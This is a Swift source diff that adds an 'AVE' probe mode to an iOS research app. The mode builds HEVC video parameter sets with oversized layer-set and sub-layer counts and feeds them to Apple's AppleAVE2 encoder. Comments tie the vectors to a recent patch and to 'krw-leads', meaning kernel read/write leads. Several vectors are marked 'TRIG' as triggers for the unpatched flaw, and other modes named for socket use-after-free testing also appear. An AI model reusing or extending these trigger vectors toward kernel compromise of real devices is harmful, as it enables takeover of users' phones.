@@ -24,6 +24,15 @@ import CoreFoundation
 import UIKit
 import WebKit
 import Metal
+import VideoToolbox
+import CoreMedia
+import CoreVideo
+
+// AVE HEVC parameter-set probe results live at file scope: the VideoToolbox
+// output callback is a plain C function pointer and cannot capture context.
+private var gAveStatus: OSStatus = -9999
+private var gAveSample: CMSampleBuffer?
+private var gAveSem: DispatchSemaphore? = nil
 
 @main
 struct AGXProbeApp: App {
@@ -140,6 +149,7 @@ final class ReachViewModel: ObservableObject {
         if args.contains("--webscan") { await runWebScanMode(); return }
         if args.contains("--decmpfs") { Task.detached { await self.runDecmpfsMode() }; return }
         if args.contains("--ane") { Task.detached { await self.runANEMode() }; return }
+        if args.contains("--ave") { Task.detached { await self.runAVEMode() }; return }
         if args.contains("--sockuaf") { Task.detached { await self.runSocketUafMode() }; return }
         if args.contains("--sockool") || args.contains("--sockxz") || args.contains("--sockgc")
             || args.contains("--sockudp") || args.contains("--sockprec")
@@ -424,7 +434,7 @@ func runFuzzMode() async {
     func runWebMode() async {
         isRunning = true; status = "Web probe..."; log = ""
         try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
-        let target = webTarget.isEmpty ? "http://198.51.100.1:8777/brtest" : webTarget
+        let target = webTarget.isEmpty ? "http://192.168.1.99:8777/brtest" : webTarget
         webProbeURL = target
         emit("loading \(target) in a WKWebView; the WebKit networking process decodes it")
         try? await Task.sleep(nanoseconds: 15_000_000_000)
@@ -444,7 +454,7 @@ func runFuzzMode() async {
     func runWebScanMode() async {
         isRunning = true; status = "Web scan..."; log = ""; scanDone = false
         try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
-        let base = webTarget.isEmpty ? "http://198.51.100.1:8777" : webTarget
+        let base = webTarget.isEmpty ? "http://192.168.1.99:8777" : webTarget
         var target = base.hasSuffix("/page") ? base : base + "/page"
         target += "?t=\(Int(Date().timeIntervalSince1970))"
         emit("loading \(target); page streams decoded /brtest back")
@@ -736,6 +746,315 @@ func runFuzzMode() async {
         emitBg("[*] ane start (ANE user-client reachability; trigger=\(trigger))")
         let opened = ane_probe(trigger ? 1 : 0)
         emitBg("=== ane done: opened=\(opened) trigger=\(trigger) ===")
+    }
+
+    // ---- AVE / AppleAVE2 HEVC parameter-set encoder probe ------------------
+    //
+    // 27.2 adds AVE_HEVC_CheckVPSExtBounds plus five callers that validate VPS
+    // layer-set and sub-layer counts derived from the caller's parameter sets;
+    // the VPS parser itself is unchanged between builds, so the fix guards
+    // consumption of those counts rather than parsing
+    // (analysis/krw-leads/ave-vps-validation-cluster-2026-11-15.md).
+    //
+    // This probe answers one narrow question on device: do Annex-B parameter
+    // sets built by the app reach AppleAVE2 through VTCompressionSessionCreate
+    // at all? The detector is positive - the crafted VPS bytes must appear in
+    // the encoder's own output stream if they were consumed.
+
+    private struct AveVector {
+        let name: String
+        let hex: String
+        let note: String
+    }
+
+    // Byte-identical to the vectors in carrier/AGXProbe/HEVCProbe.swift, which
+    // were round-tripped against an independent RBSP parser.
+    private static let aveVectors: [AveVector] = [
+        AveVector(name: "base",
+                  hex: "0000000140010c01ffff01600000030090000003000030078970240",
+                  note: "control: layers=0 sub=0 sets=0"),
+        AveVector(name: "vpsid15",
+                  hex: "000000014001fc01ffff01600000030090000003000030078970240",
+                  note: "control: VPS id 15 while SPS references id 0 - must fail"),
+        AveVector(name: "sets17c",
+                  hex: "0000000140010c01ffff01600000030090000003000030078970025ffff20",
+                  note: "single layer, sets=17 (27.2 caps sets at 15)"),
+        AveVector(name: "sub7",
+                  hex: "0000000140010c0fffff016000000300900000030000300780000972e5cb972e5cb8120",
+                  note: "vps_max_sub_layers_minus1=7 (27.2 caps at 6)"),
+        AveVector(name: "lays63",
+                  hex: "0000000140010ff1ffff0160000003009000000300003007897fd7fffffffffffffff90",
+                  note: "vps_max_layers_minus1=63 (inconsistent with a 1-layer SPS)"),
+        AveVector(name: "sets64c",
+                  hex: "0000000140010c01ffff016000000300900000030000300789700083fffffffffffffffe4",
+                  note: "TRIG: single layer, sets=64"),
+        AveVector(name: "sets255c",
+                  hex: "0000000140010c01ffff0160000003009000000300003007897000201fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc80",
+                  note: "TRIG: single layer, sets=255"),
+        AveVector(name: "sets1023c",
+                  hex: "0000000140010c01ffff01600000030090000003000030078970000801fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc8",
+                  note: "TRIG: single layer, sets=1023 (spec maximum)"),
+    ]
+
+    nonisolated func runAVEMode() {
+        let args = ProcessInfo.processInfo.arguments
+        let trig = args.contains("--avetrig")
+        emitBg("[*] ave start (AppleAVE2 HEVC VPS validation cluster; trig=\(trig))")
+        guard let baseSets = aveBaselineSets() else {
+            emitBg("[-] ave: baseline capture failed")
+            return
+        }
+        emitBg("[+] ave: baseline parameter sets \(baseSets.count) bytes")
+        for v in Self.aveVectors where trig || !v.name.hasPrefix("sets") || v.name == "sets17c" {
+            aveOne(vector: v, baselineSets: baseSets)
+        }
+        emitBg("=== ave done ===")
+    }
+
+    nonisolated private func aveBaselineSets() -> Data? {
+        var session: VTCompressionSession?
+        let st = VTCompressionSessionCreate(
+            allocator: kCFAllocatorDefault,
+            width: 64, height: 64,
+            codecType: kCMVideoCodecType_HEVC,
+            encoderSpecification: nil,
+            imageBufferAttributes: nil,
+            compressedDataAllocator: nil,
+            outputCallback: { _, _, status, _, sb in
+                gAveStatus = status; gAveSample = sb; gAveSem?.signal()
+            },
+            refcon: nil,
+            compressionSessionOut: &session)
+        guard st == noErr, let s = session else {
+            emitBg("[-] ave baseline: create -> \(st)")
+            return nil
+        }
+        var pb: CVPixelBuffer?
+        _ = CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
+                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, nil, &pb)
+        guard let pix = pb else {
+            emitBg("[-] ave baseline: pixel buffer create failed")
+            VTCompressionSessionInvalidate(s)
+            return nil
+        }
+        VTCompressionSessionPrepareToEncodeFrames(s)
+        gAveStatus = -9999; gAveSample = nil
+        let sem = DispatchSemaphore(value: 0); gAveSem = sem
+        let rc = VTCompressionSessionEncodeFrame(
+            s, imageBuffer: pix,
+            presentationTimeStamp: CMTime(value: 0, timescale: 30),
+            duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { _, _, _ in }
+        let waited = sem.wait(timeout: .now() + 6)
+        _ = VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
+        var out: Data?
+        if let sb = gAveSample, let fd = CMSampleBufferGetFormatDescription(sb) {
+            out = Self.aveAnnexB(fd)
+            let blk = CMSampleBufferGetDataBuffer(sb)
+            emitBg("[*] ave baseline: rc=\(rc) cb=\(gAveStatus) dataLen=\(blk.map { CMBlockBufferGetDataLength($0) } ?? -1) paramSets=\(out?.count ?? -1)")
+        } else {
+            emitBg("[-] ave baseline: no sample (waited=\(waited == .success ? "yes" : "timeout"))")
+        }
+        VTCompressionSessionInvalidate(s)
+        gAveSem = nil
+        return out
+    }
+
+    nonisolated private func aveOne(vector v: AveVector, baselineSets baseSets: Data) {
+        let crafted = Self.aveHex(v.hex)
+        let patched = Self.aveSplice(base: baseSets, vps: crafted)
+        emitBg("---- ave \(v.name): \(v.note), \(patched.count) bytes")
+        guard let fd = Self.aveMakeFD(patched) else {
+            emitBg("[-] ave \(v.name): CoreMedia rejected the parameter sets")
+            return
+        }
+        emitBg("[+] ave \(v.name): format description accepted (\(Self.aveDescribe(fd))")
+        var session: VTCompressionSession?
+        let st = VTCompressionSessionCreate(
+            allocator: kCFAllocatorDefault,
+            width: 64, height: 64,
+            codecType: kCMVideoCodecType_HEVC,
+            encoderSpecification: nil,
+            imageBufferAttributes: nil,
+            compressedDataAllocator: nil,
+            outputCallback: { _, _, status, _, sb in
+                gAveStatus = status; gAveSample = sb; gAveSem?.signal()
+            },
+            refcon: nil,
+            compressionSessionOut: &session)
+        emitBg("[*] ave \(v.name): session -> \(st) (\(String(format: "0x%08x", UInt32(bitPattern: st))))")
+        guard st == noErr, let s = session else { return }
+        var pb: CVPixelBuffer?
+        _ = CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
+                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, nil, &pb)
+        guard let pix = pb else { VTCompressionSessionInvalidate(s); return }
+        VTCompressionSessionPrepareToEncodeFrames(s)
+        gAveStatus = -9999; gAveSample = nil
+        let sem = DispatchSemaphore(value: 0); gAveSem = sem
+        let rc = VTCompressionSessionEncodeFrame(
+            s, imageBuffer: pix,
+            presentationTimeStamp: CMTime(value: 0, timescale: 30),
+            duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { _, _, _ in }
+        _ = sem.wait(timeout: .now() + 6)
+        _ = VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
+
+        var matched = false
+        var outDesc = "none"
+        var dataLen = -1
+        if let sb = gAveSample, let blk = CMSampleBufferGetDataBuffer(sb) {
+            dataLen = CMBlockBufferGetDataLength(blk)
+            if let ofd = CMSampleBufferGetFormatDescription(sb) {
+                outDesc = Self.aveDescribe(ofd)
+            }
+            // Consumed-parameter-set detector: does our crafted VPS body
+            // (start code dropped) appear verbatim in the encoder's own
+            // output bitstream? If yes, AppleAVE2 consumed our parameter set.
+            let needle = Array(crafted.dropFirst(4))
+            if needle.count >= 8, dataLen > 0 {
+                let buf = UnsafeMutablePointer<UInt8>.allocate(capacity: dataLen)
+                defer { buf.deallocate() }
+                let cr = CMBlockBufferCopyDataBytes(blk, atOffset: 0,
+                                                    dataLength: dataLen,
+                                                    destination: UnsafeMutableRawPointer(buf))
+                if cr == noErr {
+                    outer: for i in 0...(dataLen - needle.count) {
+                        var ok = true
+                        for j in 0..<needle.count where buf[i + j] != needle[j] {
+                            ok = false
+                            break
+                        }
+                        if ok { matched = true; break outer }
+                    }
+                }
+            }
+        }
+        emitBg("[*] ave \(v.name): encode rc=\(rc) cb=\(gAveStatus) dataLen=\(dataLen) outFD=[\(outDesc)] vpsInOutput=\(matched)")
+        VTCompressionSessionInvalidate(s)
+        gAveSem = nil
+    }
+
+    // MARK: AVE plumbing helpers
+
+    nonisolated static func aveHex(_ s: String) -> Data {
+        var bytes: [UInt8] = []
+        var i = s.startIndex
+        while i < s.endIndex {
+            let j = s.index(i, offsetBy: 2, limitedBy: s.endIndex) ?? s.endIndex
+            if let b = UInt8(s[i..<j], radix: 16) { bytes.append(b) }
+            i = j
+        }
+        return Data(bytes)
+    }
+
+    /// Split Annex-B data into NAL bodies (start codes removed).
+    nonisolated static func aveNALs(_ data: Data) -> [Data] {
+        let bytes = [UInt8](data)
+        var starts: [Int] = []
+        var i = 0
+        while i + 2 < bytes.count {
+            if bytes[i] == 0, bytes[i + 1] == 0, bytes[i + 2] == 1 {
+                starts.append(i + 3); i += 3
+            } else { i += 1 }
+        }
+        guard !starts.isEmpty else { return [] }
+        var out: [Data] = []
+        for (k, s) in starts.enumerated() {
+            let e = (k + 1 < starts.count) ? starts[k + 1] - 3 : bytes.count
+            if e > s { out.append(Data(bytes[s..<e])) }
+        }
+        return out
+    }
+
+    nonisolated static func aveSplice(base: Data, vps: Data) -> Data {
+        guard let vpsBody = aveNALs(vps).first else { return base }
+        var out = Data()
+        var replaced = false
+        for nal in aveNALs(base) {
+            guard let first = nal.first else { continue }
+            if (first >> 1) & 0x3F == 32 {          // nal_unit_type 32 = VPS
+                out.append(contentsOf: [0, 0, 0, 1]); out.append(vpsBody)
+                replaced = true
+            } else {
+                out.append(contentsOf: [0, 0, 0, 1]); out.append(nal)
+            }
+        }
+        if !replaced { out = Data([0, 0, 0, 1]) + vpsBody + out }
+        return out
+    }
+
+    nonisolated static func aveAnnexB(_ fd: CMFormatDescription) -> Data {
+        var count = 0
+        guard CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+            fd, parameterSetIndex: 0, parameterSetPointerOut: nil,
+            parameterSetSizeOut: nil, parameterSetCountOut: &count,
+            nalUnitHeaderLengthOut: nil) == noErr, count > 0 else { return Data() }
+        var out = Data()
+        for i in 0..<count {
+            var ptr: UnsafePointer<UInt8>? = nil
+            var size = 0
+            guard CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                fd, parameterSetIndex: i, parameterSetPointerOut: &ptr,
+                parameterSetSizeOut: &size, parameterSetCountOut: nil,
+                nalUnitHeaderLengthOut: nil) == noErr,
+                let p = ptr, size > 0 else { continue }
+            out.append(contentsOf: [0, 0, 0, 1])
+            out.append(p, count: size)
+        }
+        return out
+    }
+
+    nonisolated static func aveDescribe(_ fd: CMFormatDescription) -> String {
+        var count = 0
+        guard CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+            fd, parameterSetIndex: 0, parameterSetPointerOut: nil,
+            parameterSetSizeOut: nil, parameterSetCountOut: &count,
+            nalUnitHeaderLengthOut: nil) == noErr else { return "?" }
+        var parts: [String] = []
+        for i in 0..<count {
+            var ptr: UnsafePointer<UInt8>? = nil
+            var size = 0
+            guard CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                fd, parameterSetIndex: i, parameterSetPointerOut: &ptr,
+                parameterSetSizeOut: &size, parameterSetCountOut: nil,
+                nalUnitHeaderLengthOut: nil) == noErr, let p = ptr, size > 0 else { continue }
+            let type = Int((p[0] >> 1) & 0x3F)
+            var hex = ""
+            for k in 0..<min(size, 6) { hex += String(format: "%02x", p[k]) }
+            parts.append("#\(i) t\(type) \(size)B \(hex)")
+        }
+        return parts.joined(separator: " ")
+    }
+
+    nonisolated static func aveMakeFD(_ annexB: Data) -> CMFormatDescription? {
+        let bodies = aveNALs(annexB)
+        guard !bodies.isEmpty else { return nil }
+        var owned: [UnsafeMutablePointer<UInt8>] = []
+        var ptrs: [UnsafePointer<UInt8>] = []
+        var sizes: [Int] = []
+        defer { owned.forEach { $0.deallocate() } }
+        for body in bodies {
+            let n = max(body.count, 1)
+            let p = UnsafeMutablePointer<UInt8>.allocate(capacity: n)
+            body.withUnsafeBytes { raw in
+                if let src = raw.baseAddress { memcpy(p, src, body.count) }
+            }
+            owned.append(p)
+            ptrs.append(UnsafePointer(p))
+            sizes.append(body.count)
+        }
+        var fmt: CMFormatDescription?
+        let st = ptrs.withUnsafeBufferPointer { pp -> OSStatus in
+            sizes.withUnsafeBufferPointer { ss -> OSStatus in
+                CMVideoFormatDescriptionCreateFromHEVCParameterSets(
+                    allocator: kCFAllocatorDefault,
+                    parameterSetCount: bodies.count,
+                    parameterSetPointers: pp.baseAddress!,
+                    parameterSetSizes: ss.baseAddress!,
+                    nalUnitHeaderLength: 4,
+                    extensions: nil,
+                    formatDescriptionOut: &fmt)
+            }
+        }
+        return st == noErr ? fmt : nil
     }
 
     nonisolated func networkSurfaceProbe() {
